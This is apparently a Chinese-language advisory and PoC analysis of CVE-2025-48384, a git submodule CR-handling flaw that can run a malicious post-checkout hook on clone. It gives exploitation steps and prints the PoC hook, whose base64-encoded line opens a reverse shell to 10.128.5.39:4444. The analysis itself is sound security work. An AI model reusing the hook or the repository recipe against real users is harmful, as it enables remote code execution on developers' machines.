## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符()处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)